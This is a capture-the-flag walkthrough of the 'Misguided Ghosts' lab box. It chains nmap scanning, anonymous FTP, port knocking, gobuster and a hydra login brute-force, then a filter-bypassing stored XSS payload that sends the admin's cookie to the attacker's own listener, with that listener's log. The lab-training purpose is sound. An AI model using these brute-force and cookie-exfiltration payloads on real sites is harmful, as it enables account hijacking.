> Misguided Ghosts 

## export IP=10.10.246.84

# Nmap 

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

# Anonymous FTP login

```
-rw-r--r--    1 ftp      ftp           103 Aug 28 18:11 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26 18:51 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18 18:12 trace.pcapng
```

We got the files. Looking at jokes.txt we come to know that we have port knock and from the pcap file we can find the port knocking sequence.

# Inspecting the packet

By searching out of source packets i.e) by ip address we get the port knocking sequence

## Search Query => ip.addr == 192.168.236.131

`7864 8273 9241 12007 60753`

Let's port knock using knockd

knock ghosts.thm 7864 8273 9241 12007 60753

Now we got port 8080.

```
21/tcp   open  ftp        syn-ack
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack
```

It seems to use ssl. Lets try https:IP:8080. Couldn't do much with that image let's move onto Directory Bruteforcing.

sudo gobuster -u https://$IP:8080 -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -k 2>/dev/null -o gobuster/port_8080

```
login
```

Looking at the certificate, it is issued by zac. Let's try bruteforcing using hydra.

hydra -l zac -P /snap/john-the-ripper/rockyou.txt -S $IP -s 8080 http-post-form "/login:username=^USER^&password=^PASS^&submit=Login:S=302"

```
zac
```

We can post here let's try to get admin's cookie using XSS. trying basic XSS `<scipt>alert('hi')</script>` and it says `You're too late for the XSS bounty.`. Mm, we have a chance. Let's use reflective XSS.

`&lt;sscriptcript&gt;alert('hi')&lt;/sscriptscript&gt;`

Let's try stored XSS and now we can set up a local server and make the box to communicate with us.

`&lt;sscriptcript&gt;var i = new Image(); i.src = "http://10.8.107.21:1234/" + document.cookie;&lt;/sscriptcript&gt;`

And yep we got his cookie 

```
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.8.107.21 - - [14/Nov/2020 13:24:26] code 404, message File not found
10.8.107.21 - - [14/Nov/2020 13:24:26] "GET /login=zac_from_paramore HTTP/1.1" 404 -
10.10.224.54 - - [14/Nov/2020 13:25:45] code 404, message File not found
10.10.224.54 - - [14/Nov/2020 13:25:45] "GET /login=hayley_is_admin HTTP/1.1" 404 -
```

Replacing the cookie in the browser we have nothing interesting. Let's try gobuster.

gobuster -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://$IP:8080 -c "login={admin_cookie}" -k 2>/dev/null

```
/login
/photos
```

